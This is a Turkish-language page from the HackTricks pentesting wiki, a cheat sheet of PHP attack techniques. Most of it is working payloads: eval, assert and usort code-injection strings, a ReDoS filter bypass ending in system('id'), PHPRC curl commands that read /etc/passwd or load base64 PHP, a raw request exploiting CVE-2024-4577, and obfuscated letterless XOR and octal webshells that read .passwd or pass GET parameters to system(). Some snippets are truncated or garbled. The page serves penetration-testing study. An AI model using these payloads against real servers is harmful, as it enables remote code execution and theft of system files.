# PHP Tricks

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Web uygulamalarınız, ağınız ve bulutunuz hakkında bir hacker perspektifi edinin**

**Gerçek iş etkisi olan kritik, istismar edilebilir güvenlik açıklarını bulun ve raporlayın.** Saldırı yüzeyini haritalamak, ayrıcalıkları artırmanıza izin veren güvenlik sorunlarını bulmak ve temel kanıtları toplamak için otomatik istismarları kullanmak için 20'den fazla özel aracımızı kullanın, sıkı çalışmanızı ikna edici raporlara dönüştürün.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Çerezlerin yaygın konumu:

Bu, phpMyAdmin çerezleri için de geçerlidir.

Çerezler:
```
PHPSESSID
phpMyAdmin
```
Konumlar:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP karşılaştırmalarını atlatma

### Gevşek karşılaştırmalar/Tip Değiştirme ( == )

Eğer `==` PHP'de kullanılıyorsa, beklenmedik durumlar ortaya çıkabilir ve karşılaştırma beklenildiği gibi davranmayabilir. Bunun nedeni, "==" yalnızca aynı tipe dönüştürülmüş değerleri karşılaştırmasıdır; karşılaştırılan verilerin tipinin de aynı olmasını istiyorsanız `===` kullanmalısınız.

PHP karşılaştırma tabloları: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (567).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Sayı ile başlamayan bir dize, bir sayıya eşittir
* `"0xAAAA" == "43690" -> True` Onaltılık veya ondalık formatta sayılardan oluşan dizeler, sayılar aynıysa diğer sayılar/dizeler ile True sonucu verecek şekilde karşılaştırılabilir (bir dizedeki sayılar sayılar olarak yorumlanır)
* `"0e3264578" == 0 --> True` "0e" ile başlayan ve ardından herhangi bir şey gelen bir dize, 0'a eşit olacaktır
* `"0X3264578" == 0X --> True` "0" ile başlayan ve ardından herhangi bir harf (X herhangi bir harf olabilir) ve ardından herhangi bir şey gelen bir dize, 0'a eşit olacaktır
* `"0e12334" == "0" --> True` Bu çok ilginçtir çünkü bazı durumlarda "0" dizisinin girdiğini ve bununla karşılaştırılan bir içeriği kontrol edebilirsiniz. Bu nedenle, "0e" ile başlayan ve herhangi bir harf içermeyen bir hash oluşturacak bir değer sağlayabilirseniz, karşılaştırmayı atlatabilirsiniz. Bu formatta **zaten hashlenmiş dizeleri** burada bulabilirsiniz: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Bir dizedeki herhangi bir harf, int 0'a eşittir

Daha fazla bilgi için [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Tip Değiştirme** varsayılan olarak `in_array()` fonksiyonunu da etkiler (katı bir karşılaştırma yapmak için üçüncü argümanı true olarak ayarlamanız gerekir):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Eğer bu fonksiyon **herhangi bir kimlik doğrulama kontrolü** için kullanılıyorsa (şifre kontrolü gibi) ve kullanıcı karşılaştırmanın bir tarafını kontrol ediyorsa, şifre değeri olarak bir dizi yerine boş bir dizi gönderebilir (`https://example.com/login.php/?username=admin&password[]=`) ve bu kontrolü atlayabilir:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
`strcasecmp()` ile aynı hata meydana gelir

### Katı Tür Dönüşümü

`===` **kullanılıyor olsa bile**, **karşılaştırmayı zayıf hale getiren** hatalar olabilir. Örneğin, eğer karşılaştırma **karşılaştırmadan önce veriyi farklı bir tür nesneye dönüştürüyorsa**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** kullanıcı girişi **doğrulamak** için kullanılabilir (kullanıcı girişi üzerinde herhangi bir **kelime/regex** **kara liste**'den **var mı** olduğunu **kontrol eder** ve eğer yoksa, kod çalışmaya devam edebilir).

#### Yeni satır atlatma

Ancak, regexp'nin başlangıcını belirlerken `preg_match()` **kullanıcı girişinin sadece ilk satırını kontrol eder**, eğer bir şekilde girişi **birden fazla satırda** **gönderebilirseniz**, bu kontrolü atlatabilirsiniz. Örnek:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Bu kontrolü atlamak için **değerleri yeni satırlarla urlencoded olarak gönderebilirsiniz** (`%0A`) veya **JSON verisi** gönderebiliyorsanız, bunu **birkaç satırda** gönderin:
```php
{
"cmd": "cat /etc/passwd"
}
```
Bir örneği burada bulabilirsiniz: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Uzunluk hatası atlatma**

(Bu atlatma, görünüşe göre PHP 5.2.5 üzerinde denendi ve PHP 7.3.15 üzerinde çalıştırmayı başaramadım)\
`preg_match()`'e geçerli çok **büyük bir girdi** gönderebilirseniz, **işleyemeyecek** ve kontrolü **atlatabileceksiniz**. Örneğin, bir JSON'u kara listeye alıyorsa, şunu gönderebilirsiniz:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS Bypass

Trick from: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) and [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Kısacası, sorun PHP'deki `preg_*` fonksiyonlarının [PCRE kütüphanesi](http://www.pcre.org/) üzerine inşa edilmesinden kaynaklanıyor. PCRE'de belirli düzenli ifadeler, çok sayıda özyinelemeli çağrı kullanılarak eşleştirilir, bu da çok fazla yığın alanı kullanır. İzin verilen özyineleme sayısı için bir sınır belirlemek mümkündür, ancak PHP'de bu sınır [varsayılan olarak 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) olup, bu yığında sığacak olandan fazladır.

[Bu Stackoverflow başlığı](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) da bu konunun daha derinlemesine tartışıldığı gönderide bağlantılıydı. Görevimiz şimdi açıktı:\
**Regex'in 100\_000+ özyineleme yapmasını sağlayacak bir girdi gönderin, bu da SIGSEGV'ye neden olacak, `preg_match()` fonksiyonunun `false` döndürmesini sağlayacak ve böylece uygulamanın girdimizin kötü niyetli olmadığını düşünmesine neden olacak, yükün sonunda `{system(<verybadcommand>)}` gibi bir sürpriz atarak SSTI --> RCE --> flag :) elde etmek.** 

Aslında regex terimleriyle, 100k "özyineleme" yapmıyoruz, bunun yerine "geri izleme adımlarını" sayıyoruz, ki [PHP belgeleri](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) buna `pcre.backtrack_limit` değişkeninde varsayılan olarak 1\_000\_000 (1M) olduğunu belirtmektedir.\
Buna ulaşmak için, `'X'*500_001` 1 milyon geri izleme adımına (500k ileri ve 500k geri) yol açacaktır:
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHP obfuscation için Tip Dolaşımı
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

Eğer PHP başka bir sayfaya yönlendiriyorsa ancak **`die`** veya **`exit`** fonksiyonu **`Location`** başlığı ayarlandıktan sonra çağrılmadıysa, PHP çalışmaya devam eder ve verileri gövdeye ekler:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Path Traversal ve Dosya Dahil Etme Sömürüsü

Kontrol et:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## Daha fazla hile

* **register\_globals**: **PHP < 4.1.1.1**'de veya yanlış yapılandırıldığında, **register\_globals** aktif olabilir (veya davranışları taklit ediliyor olabilir). Bu, $\_GET gibi global değişkenlerde bir değer varsa örneğin $\_GET\["param"]="1234", **$param üzerinden erişebileceğiniz anlamına gelir. Bu nedenle, HTTP parametreleri göndererek, kod içinde kullanılan değişkenleri** geçersiz kılabilirsiniz.
* **Aynı alanın PHPSESSION çerezleri aynı yerde saklanır**, bu nedenle bir alanda **farklı çerezler farklı yollarla kullanılıyorsa**, bir yolun **diğer yolun çerezine erişmesini** sağlayarak diğer yol çerezinin değerini ayarlayabilirsiniz.\
Bu şekilde, eğer **her iki yol da aynı isimde bir değişkene erişiyorsa**, **o değişkenin path1'deki değeri path2'ye uygulanabilir**. Ve ardından path2, path1'in değişkenlerini geçerli olarak alacaktır (çereze path2'deki karşılık gelen ismi vererek).
* Makinenin kullanıcılarının **kullanıcı adlarını** aldığınızda, php dizinlerinin etkin olup olmadığını görmek için adresi kontrol edin: **/\~\<USERNAME>**.
* [**LFI ve RCE php sarmalayıcıları kullanarak**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Bu fonksiyonlar genellikle PHP'de **şifrelerden hash oluşturmak** ve bir hash ile karşılaştırıldığında bir şifrenin doğru olup olmadığını **kontrol etmek** için kullanılır.\
Desteklenen algoritmalar: `PASSWORD_DEFAULT` ve `PASSWORD_BCRYPT` ( `$2y$` ile başlar). **PASSWORD\_DEFAULT genellikle PASSWORD\_BCRYPT ile aynıdır.** Ve şu anda, **PASSWORD\_BCRYPT**'in **girişte 72baytlık bir boyut sınırlaması vardır**. Bu nedenle, bu algoritma ile 72bayttan daha büyük bir şeyi hashlemeye çalıştığınızda yalnızca ilk 72B kullanılacaktır:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP başlıkları bypass ederek PHP hatalarını istismar etme

#### Başlıkları ayarladıktan sonra hata oluşturma

[**bu twitter dizisinden**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A\&s=19) görebilirsiniz ki, 1000'den fazla GET parametresi veya 1000'den fazla POST parametresi veya 20 dosya gönderildiğinde, PHP yanıtında başlıkları ayarlamayacaktır.

Bu, örneğin CSP başlıklarının kodlarda ayarlanmasını bypass etmeye olanak tanır:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### Başlıkları ayarlamadan önce bir gövde doldurma

Eğer bir **PHP sayfası hataları yazdırıyorsa ve kullanıcı tarafından sağlanan bazı girdileri geri ekrana basıyorsa**, kullanıcı PHP sunucusunun geri dönen bazı **içerikleri yeterince uzun** yapmasını sağlayabilir, böylece sunucu **başlıkları** yanıtın içine eklemeye çalıştığında bir hata verecektir.\
Aşağıdaki senaryoda **saldırgan sunucunun büyük hatalar vermesini sağladı** ve ekranda görebileceğiniz gibi PHP başlık bilgilerini **değiştirmeye çalıştığında, başaramadı** (örneğin CSP başlığı kullanıcıya gönderilmedi):

![](<../../../.gitbook/assets/image (1085).png>)

## PHP fonksiyonlarında SSRF

Sayfayı kontrol edin:

{% content-ref url="php-ssrf.md" %}
[php-ssrf.md](php-ssrf.md)
{% endcontent-ref %}

## Kod yürütme

**system("ls");**\
&#xNAN;**\`ls\`;**\
**shell\_exec("ls");**

[Daha fazla yararlı PHP fonksiyonu için bunu kontrol edin](php-useful-functions-disable_functions-open_basedir-bypass/)

### **preg\_replace()** ile **RCE**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" argümanında kodu çalıştırmak için en az bir eşleşme gereklidir.\
Bu preg\_replace seçeneği **PHP 5.5.0 itibarıyla kullanımdan kaldırılmıştır.**

### **Eval() ile RCE**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **Assert() ile RCE**

Php içindeki bu fonksiyon, **bir dize içinde yazılmış kodu çalıştırmanıza** olanak tanır ve **true veya false döndürür** (ve buna bağlı olarak yürütmeyi değiştirir). Genellikle kullanıcı değişkeni bir dize içinde ortada yer alır. Örneğin:\
`assert("strpos($_GET['page']),'..') === false")` --> Bu durumda **RCE** elde etmek için şunu yapabilirsiniz:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
You will need to **break** the code **syntax**, **add** your **payload**, and then **fix it again**. You can use **logic operations** such as "**and" or "%26%26" or "|"**. Note that "or", "||" doesn't work because if the first condition is true our payload won't get executed. The same way ";" doesn't work as our payload won't be executed.

**Diğer seçenek** is to add to the string the execution of the command: `'.highlight_file('.passwd').'`

**Diğer seçenek** (if you have the internal code) is to modify some variable to alter the execution: `$file = "hola"`

### **RCE via usort()**

This function is used to sort an array of items using an specific function.\
To abuse this function:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
You can also use **//** to comment the rest of the code.

To discover the number of parenthesis that you need to close:

* `?order=id;}//`: bir hata mesajı alıyoruz (`Parse error: syntax error, unexpected ';'`). Muhtemelen bir veya daha fazla parantez eksik.
* `?order=id);}//`: bir **uyarı** alıyoruz. Bu doğru görünüyor.
* `?order=id));}//`: bir hata mesajı alıyoruz (`Parse error: syntax error, unexpected ')' i`). Muhtemelen fazla kapanış parantezimiz var.

### **RCE via .httaccess**

Eğer **.htaccess** yükleyebiliyorsanız, o zaman birkaç şeyi **yapılandırabilir** ve hatta kod çalıştırabilirsiniz (uzantısı .htaccess olan dosyaların **çalıştırılabilir** olduğunu yapılandırarak).

Farklı .htaccess shell'leri [burada](https://github.com/wireghoul/htshells) bulunabilir.

### RCE via Env Variables

Eğer PHP'de **env değişkenlerini değiştirmeye** izin veren bir zafiyet bulursanız (ve dosya yüklemeye izin veren başka bir zafiyet, daha fazla araştırmayla belki bu aşılabilir), bu davranışı **RCE** elde etmek için kötüye kullanabilirsiniz.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld_preload-and-ld_library_path): Bu env değişkeni, diğer ikili dosyaları çalıştırırken rastgele kütüphaneleri yüklemenize izin verir (bu durumda çalışmayabilir).
* **`PHPRC`** : PHP'ye **konfigürasyon dosyasını nerede bulacağını** belirtir, genellikle `php.ini` olarak adlandırılır. Kendi konfigürasyon dosyanızı yükleyebilirseniz, o zaman `PHPRC`'yi PHP'yi ona yönlendirmek için kullanın. İkinci yüklenen dosyayı belirten bir **`auto_prepend_file`** girişi ekleyin. Bu ikinci dosya, PHP çalışma zamanı tarafından diğer kodlardan önce **çalıştırılan** normal **PHP kodunu** içerir.
1. Shell kodumuzu içeren bir PHP dosyası yükleyin.
2. Adım 1'de yüklediğimiz dosyayı çalıştırması için PHP ön işleyicisine talimat veren bir **`auto_prepend_file`** direktifi içeren ikinci bir dosya yükleyin.
3. `PHPRC` değişkenini adım 2'de yüklediğimiz dosyaya ayarlayın.
* Bu zinciri nasıl çalıştıracağınız hakkında daha fazla bilgi [**orijinal rapordan**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/) alın.
* **PHPRC** - başka bir seçenek
* Eğer **dosya yükleyemiyorsanız**, FreeBSD'de **`stdin`**'i içeren "file" `/dev/fd/0` kullanabilirsiniz:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Ya da RCE elde etmek için **`allow_url_include`**'yi etkinleştirip **base64 PHP kodu** ile bir dosya ekleyin:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Teknik [**bu rapordan**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

Web sunucusu HTTP isteklerini ayrıştırır ve bunları `php.exe cgi.php foo=bar` gibi bir isteği çalıştıran bir PHP betiğine iletir, bu da bir parametre enjeksiyonuna izin verir. Bu, gövde içindeki PHP kodunu yüklemek için aşağıdaki parametreleri enjekte etmeye izin verecektir:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
Ayrıca, PHP'nin sonraki normalizasyonu nedeniyle "-" parametresini 0xAD karakteri kullanarak enjekte etmek mümkündür. [**bu gönderiden**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/) örneği kontrol edin:
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitizasyon atlatma & Brain Fuck

[**Bu yazıda**](https://blog.redteam-pentesting.de/2024/moodle-rce/) çok az karakterin izin verildiği bir brain fuck PHP kodu oluşturmak için harika fikirler bulmak mümkündür.\
Ayrıca, birkaç kontrolü atlatmalarını sağlayan fonksiyonları çalıştırmanın ilginç bir yolu da önerilmektedir:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP Statik analizi

Bu fonksiyonlara yapılan çağrılarda kod ekleyip ekleyemeyeceğinizi kontrol edin (buradan): [here](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Eğer bir PHP uygulamasını hata ayıklıyorsanız, `display_errors = On` ekleyerek `/etc/php5/apache2/php.ini` dosyasında hata yazdırmayı global olarak etkinleştirebilir ve apache'yi yeniden başlatabilirsiniz: `sudo systemctl restart apache2`

### PHP kodunu deşifre etme

PHP kodunu deşifre etmek için **web**[ **www.unphp.net**](http://www.unphp.net) **kullanabilirsiniz.**

## PHP Sarıcıları ve Protokoller

PHP Sarıcıları ve protokolleri, bir sistemde **yazma ve okuma korumalarını atlamanıza** ve onu tehlikeye atmanıza olanak tanıyabilir. [**daha fazla bilgi için bu sayfayı kontrol edin**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug kimlik doğrulaması yapılmamış RCE

Eğer `phpconfig()` çıktısında **Xdebug**'ın **etkin** olduğunu görüyorsanız, [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit) üzerinden RCE elde etmeyi denemelisiniz.

## Değişken değişkenler
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE yeni $\_GET\["a"]\($\_GET\["b")'yi istismar etme

Bir sayfada **rastgele bir sınıfın yeni bir nesnesini oluşturabiliyorsanız** RCE elde etme şansınız olabilir, nasıl yapılacağını öğrenmek için aşağıdaki sayfayı kontrol edin:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md)
{% endcontent-ref %}

## Harf olmadan PHP çalıştırma

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Sekizli kullanarak
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR kolay shell kodu

[**bu yazıya** ](https://mgp25.com/ctf/Web-challenge/)göre, aşağıdaki şekilde kolay bir shell kodu oluşturmak mümkündür:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Yani, eğer **rakamlar ve harfler olmadan rastgele PHP çalıştırabiliyorsanız**, aşağıdaki gibi bir istek gönderebilirsiniz, bu yükü kullanarak rastgele PHP çalıştırmak için:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Daha derin bir açıklama için [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg_match) adresine bakın.

### XOR Shellcode (eval içinde)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl benzeri
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Web uygulamalarınız, ağınız ve bulutunuz hakkında bir hacker perspektifi edinin**

**Gerçek iş etkisi olan kritik, istismar edilebilir güvenlik açıklarını bulun ve raporlayın.** Saldırı yüzeyini haritalamak, ayrıcalıkları artırmanıza izin veren güvenlik sorunlarını bulmak ve temel kanıtları toplamak için otomatik istismarları kullanmak için 20'den fazla özel aracımızı kullanın, böylece sıkı çalışmanızı ikna edici raporlara dönüştürebilirsiniz.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
